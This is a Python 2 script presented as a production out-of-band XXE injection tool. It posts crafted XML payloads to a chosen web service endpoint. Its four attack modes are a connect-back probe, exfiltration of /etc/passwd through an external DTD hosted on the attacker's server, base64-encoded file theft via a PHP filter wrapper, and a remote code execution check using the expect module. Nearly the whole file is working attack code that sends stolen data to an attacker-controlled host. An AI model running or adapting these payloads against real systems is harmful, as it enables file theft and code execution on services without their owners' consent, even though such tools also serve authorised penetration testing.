#!/usr/bin/env python
__author__ = "Munir Njiru"
__email__ = "munir@alien-within.com"
__status__ = "Production"

import requests as alienOOBXXERequestor
import tldextract

print "#######################################\n"
print "Simple Out of Band XXE Injection Tool.\nby Alienwithin\nVersion: 1.0\nWebsite: https://www.alien-within.com\n"
print "#######################################\n\n"
'''
Basic Settings that should be changed below: 
- Endpoint to attack or webservice URL
- IP and Port of python simple http server (i.e attacker's server to receive information) or XXE Server Component
'''
attacker_ip = "ATTACKER IP"
attacker_port = "ATTACKER PORT"
endpoint = "URL TO VICTIM WEBSERVICE e.g. http://target.com/webservice.php"
fullURL=tldextract.extract(endpoint)
targetHostname=fullURL.domain
'''
Basic Settings End

Ignore the below its basic Headers predefined
'''

XXEHeaders = {
'Host': targetHostname,
'Accept': 'text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
'Accept-Encoding': 'gzip, deflate',
'Accept-Language': 'en-us,en;q=0.5',
'Cache-Control': 'no-cache',
'Content-Type': 'text/xml',
'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.16 Safari/537.36',
'X-HTTP-Method-Override': 'GET'
}

'''
From this section downwards we have the Four attack Types supported so far:
	- Pinging to see if we can force it to connect to our target server from the target
	- Retrieve File with no encoding
	- Retrieve file base64 encoded incase of borderline protection
	- Attempt RCE via the expect module if it is loaded (PHP only)
'''
attack_type = raw_input("What attack type would you like to execute?\n1. Simple Connect Back Request\n2. Attempt to Retrieve File (File Protocol)\n3. Attempt to retrieve file (Using PHP filter wrapper)\n4. Check Code execution using expect\n")

if attack_type=="1":
	print "Please ensure you have started python HTTP Server in another commandline tab; to do so run the command below:\npython -m SimpleHTTPServer\n\nAfter this is done please confirm that the IP address and port are configured in the script in the settings section.\n" 
	check_complete=raw_input("Proceed with attack?\n1. Yes\n2. No\n")
	if check_complete == "1":
		connect_back = "<?xml version=\"1.0\" encoding=\"utf-8\"?><!DOCTYPE r [<!ENTITY % s \"http://fakeurltoCloak\"><!ENTITY % d \"AliensLoveXXE.test\"><!ENTITY % dtd SYSTEM \"http://"+attacker_ip+":"+attacker_port+"/dtd\">  %dtd;]><r>&a;</r>"
		testConnectBack = alienOOBXXERequestor.post(endpoint,headers=XXEHeaders,data={'name':connect_back})
		print testConnectBack.text
	else:
		print "User aborted the attack; script will now exit. "
		exit()

elif attack_type == "2": 
	getFilePlain = "<!DOCTYPE fileexfiltration [<!ENTITY % get SYSTEM \"file:///etc/passwd\"><!ENTITY % dtd SYSTEM \"http://"+attacker_ip+":"+attacker_port+"/getFile.dtd\" > %get%dtd;]>"
	testPlainFileRetrieve=alienOOBXXERequestor.post(endpoint,headers=XXEHeaders,data=getFilePlain)
	print testPlainFileRetrieve.text

elif attack_type == "3":
	getFileEncoded = "<!DOCTYPE root [      <!ENTITY % remote SYSTEM \"http://"+attacker_ip+":"+attacker_port+"/getFileEncoded.dtd\"> %remote; %internal; %xxe; ]>"
	testEncodedFileRetrieve = alienOOBXXERequestor.post(endpoint,headers=XXEHeaders,data=getFileEncoded)
	print testEncodedFileRetrieve.text

elif attack_type == "4":
	checkRCE = "<!DOCTYPE root [      <!ENTITY % remote SYSTEM \"http://"+attacker_ip+":"+attacker_port+"/rceEncoded.dtd\"> %remote; %internal; %xxe; ]>"
	testRCE = alienOOBXXERequestor.post(endpoint,headers=XXEHeaders,data=checkRCE)
	print testRCE.text

else:
	print "I really don't know the attack type you are trying to run I will now exit"
	exit()

